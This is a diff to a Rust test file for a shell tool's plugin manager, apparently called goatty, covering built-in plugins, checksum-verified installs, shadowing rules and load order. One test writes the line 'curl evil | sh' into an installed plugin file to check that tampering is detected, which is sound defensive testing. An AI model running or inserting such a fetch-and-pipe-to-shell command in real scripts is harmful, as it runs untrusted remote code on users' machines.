@@ -74,6 +74,16 @@ impl World {
     }
 }
 
+/// The installed plugins that don't come with goatty.
+fn installed(cat: &Catalog) -> Vec<&Installed> {
+    cat.installed.iter().filter(|i| !i.builtin).collect()
+}
+
+/// Ids of the active plugins that don't come with goatty.
+fn active_ids(dirs: &Dirs, s: &HostSettings) -> Vec<String> {
+    super::active(dirs, s).0.into_iter().filter(|a| matches!(a.origin, Origin::Installed(_))).map(|a| a.manifest.id).collect()
+}
+
 #[test]
 fn plan_install_render_uninstall() {
     let w = world();
@@ -83,7 +93,8 @@ fn plan_install_render_uninstall() {
     let cat = p.catalog(false, &settings);
     assert_eq!(cat.registries[0].plugins, 2, "{:?}", cat.registries);
     assert_eq!(cat.available.iter().map(|a| a.id.as_str()).collect::<Vec<_>>(), ["demo", "greet"]);
-    assert!(cat.installed.is_empty());
+    assert!(installed(&cat).is_empty());
+    assert_eq!(cat.installed.len(), builtins::BUILTINS.len(), "the built-in plugins are always there");
 
     let c = p.find("demo", None).unwrap();
     let plan = p.plan(&c, &settings).unwrap();
@@ -98,7 +109,8 @@ fn plan_install_render_uninstall() {
     assert!(w.dirs.bin_dir().join("demo").is_file());
     assert!(lock::bundle_dir(&w.dirs, "demo").join("plugin.toml").is_file());
     let cat = p.catalog(false, &settings);
-    assert_eq!(cat.installed[0].id, "demo");
+    assert_eq!(installed(&cat)[0].id, "demo");
+    assert_eq!(installed(&cat)[0].packages[0].state, PackageState::Managed { version: "2.0".into() });
     assert_eq!(cat.available[0].installed.as_deref(), Some("1.0.0"));
 
     // Rendered with the user's setting.
@@ -112,7 +124,7 @@ fn plan_install_render_uninstall() {
 
     // Disabled: installed but not rendered.
     s.plugins.get_mut("demo").unwrap().enabled = false;
-    assert!(super::active(&w.dirs, &s).0.is_empty());
+    assert!(active_ids(&w.dirs, &s).is_empty());
 
     p.uninstall("demo").unwrap();
     assert!(!w.dirs.bin_dir().join("demo").exists());
@@ -142,8 +154,8 @@ fn shell_code_is_shown_and_checked() {
 
     // Changing an installed file after the fact takes the plugin out.
     std::fs::write(lock::bundle_dir(&w.dirs, "greet").join("zsh/init.zsh"), "curl evil | sh\n").unwrap();
-    let (active, issues) = super::active(&w.dirs, &settings);
-    assert!(active.is_empty());
+    let (_, issues) = super::active(&w.dirs, &settings);
+    assert!(active_ids(&w.dirs, &settings).is_empty());
     assert!(issues[0].contains("changed after it was installed"), "{issues:?}");
 }
 
@@ -164,7 +176,8 @@ fn local_plugins_are_flagged_and_conflicts_refused() {
     )
     .unwrap();
     let c = Candidate::local(&dir).unwrap();
-    assert!(p.plan(&c, &settings).unwrap_err().to_string().contains("built-in Starship"));
+    let err = p.plan(&c, &settings).unwrap_err().to_string();
+    assert!(err.contains("starship comes with goatty's built-in starship plugin"), "{err}");
 
     std::fs::write(dir.join("plugin.toml"), text.replace("id = \"demo\"\nname", "id = \"mine\"\nname")).unwrap();
     let c = Candidate::local(&dir).unwrap();
@@ -207,7 +220,7 @@ fn update_replaces_version_and_packages() {
     let p = Plugins { dirs: &w.dirs, fetch: &fetch, builtin: &w.sources };
 
     let cat = p.catalog(true, &settings);
-    assert_eq!(cat.installed[0].update.as_deref(), Some("1.1.0"));
+    assert_eq!(installed(&cat)[0].update.as_deref(), Some("1.1.0"));
     let c2 = p.find("demo", None).unwrap();
     let plan2 = p.plan(&c2, &settings).unwrap();
     assert_eq!(plan2.replaces.as_deref(), Some("1.0.0"));
@@ -215,5 +228,95 @@ fn update_replaces_version_and_packages() {
     assert!(w.dirs.tools_dir().join("demo/2.1").is_dir());
     assert!(!w.dirs.tools_dir().join("demo/2.0").exists());
     assert_eq!(std::fs::read_to_string(w.dirs.bin_dir().join("demo")).unwrap(), "#!/bin/sh\necho demo2\n");
-    assert!(p.catalog(false, &settings).installed[0].update.is_none());
+    assert!(installed(&p.catalog(false, &settings))[0].update.is_none());
+}
+
+#[test]
+fn builtin_plugins_install_only_their_packages() {
+    let w = world();
+    let mut fetch = w.fetch.clone();
+    let archive = targz(&[("zsh-autosuggestions-0.7.1/zsh-autosuggestions.zsh", b"suggest_loaded=1\n")]);
+    let b = builtins::get("autosuggestions").unwrap();
+    // The real pin's checksum can't match a test archive: plan against a copy with this one's.
+    let mut c = Candidate::builtin(b);
+    let pkg = &mut c.manifest.packages[0];
+    pkg.system_paths.clear(); // the host's distro copy mustn't count here
+    pkg.assets[0].sha256 = goatty_plugin::bundle::sha256_hex(&archive);
+    fetch.0.insert(pkg.assets[0].url.clone(), archive);
+    let p = Plugins { dirs: &w.dirs, fetch: &fetch, builtin: &w.sources };
+    let settings = HostSettings::default();
+
+    assert!(p.find("autosuggestions", Some("9.9.9")).is_err(), "other versions come with other goatty releases");
+    let plan = p.plan(&c, &settings).unwrap();
+    assert!(plan.builtin && plan.verified && plan.replaces.is_none());
+    assert_eq!(plan.source, "goatty");
+    let d = &plan.downloads[0];
+    assert!(d.fetches() && d.script.as_deref() == Some("zsh-autosuggestions.zsh"), "{d:?}");
+    assert!(plan.shell_code.as_ref().unwrap().1.contains("ZSH_AUTOSUGGEST_STRATEGY"));
+
+    p.install(&c, &plan.digest, &settings).unwrap();
+    assert!(w.dirs.plugins_dir().join("autosuggestions/zsh-autosuggestions.zsh").is_file());
+    assert!(Lock::load(&w.dirs).unwrap().plugins.is_empty(), "built-in plugins have no lock entry");
+    assert!(!lock::bundle_dir(&w.dirs, "autosuggestions").exists(), "nor copied files");
+
+    // Planned again: nothing left to download.
+    let again = p.plan(&c, &settings).unwrap();
+    assert!(again.downloads[0].current && !again.downloads[0].fetches());
+    assert_eq!(again.download_size(), 0);
+
+    // Uninstalling isn't a thing; removing the download is.
+    assert!(p.uninstall("autosuggestions").unwrap_err().to_string().contains("turn it off instead"));
+    assert_eq!(p.remove_packages(b).unwrap(), ["autosuggestions"]);
+    assert!(!w.dirs.plugins_dir().join("autosuggestions").exists());
+    assert!(p.remove_packages(b).unwrap().is_empty());
+}
+
+#[test]
+fn registry_plugins_cannot_shadow_builtins() {
+    let w = world();
+    let p = w.plugins();
+    let settings = HostSettings::default();
+    let dir = w.tmp.path().join("fake-atuin");
+    std::fs::create_dir_all(&dir).unwrap();
+    let text = std::fs::read_to_string(w.tmp.path().join("registry/plugins/demo/1.0.0/plugin.toml")).unwrap();
+    std::fs::write(dir.join("plugin.toml"), text.replace("id = \"demo\"\nname", "id = \"atuin\"\nname")).unwrap();
+    let err = p.plan(&Candidate::local(&dir).unwrap(), &settings).unwrap_err().to_string();
+    assert!(err.contains("comes with goatty"), "{err}");
+    // A package id of a built-in plugin (tools/<id>/ is theirs).
+    std::fs::write(
+        dir.join("plugin.toml"),
+        text.replace("id = \"demo\"\nname", "id = \"mine\"\nname")
+            .replace("id = \"demo\"\nversion = \"2.0\"", "id = \"fzf\"\nversion = \"2.0\""),
+    )
+    .unwrap();
+    let err = p.plan(&Candidate::local(&dir).unwrap(), &settings).unwrap_err().to_string();
+    assert!(err.contains("belongs to goatty's built-in fzf plugin"), "{err}");
+    // `find` always resolves a built-in id to the built-in plugin.
+    assert!(p.find("atuin", None).unwrap().builtin.is_some());
+}
+
+#[test]
+fn builtins_are_active_unless_turned_off_and_ordered() {
+    let w = world();
+    let mut s = HostSettings::default();
+    let ids = |s: &HostSettings| super::active(&w.dirs, s).0.into_iter().map(|a| a.manifest.id).collect::<Vec<_>>();
+    assert_eq!(ids(&s), ["fzf", "atuin", "autosuggestions", "starship", "syntax-highlighting"]);
+    s.edit_plugin("atuin", |c| c.enabled = false);
+    assert_eq!(ids(&s), ["fzf", "autosuggestions", "starship", "syntax-highlighting"]);
+    let (_, issues) = super::active(&w.dirs, &s);
+    assert!(issues.is_empty(), "settings for built-in plugins aren't 'not installed': {issues:?}");
+
+    // `after` within a slot, whatever order they come in; a cycle doesn't hang.
+    let mut list = super::active(&w.dirs, &HostSettings::default()).0;
+    list.reverse();
+    let order: Vec<String> = load_order(list.clone()).into_iter().map(|a| a.manifest.id).collect();
+    let pos = |id: &str| order.iter().position(|x| x == id).unwrap();
+    assert!(pos("fzf") < pos("atuin") && pos("atuin") < pos("autosuggestions"), "{order:?}");
+    assert_eq!(order.last().map(String::as_str), Some("syntax-highlighting"));
+    for a in &mut list {
+        if a.manifest.id == "fzf" {
+            a.manifest.zsh.after = vec!["autosuggestions".into()];
+        }
+    }
+    assert_eq!(load_order(list).len(), 5);
 }
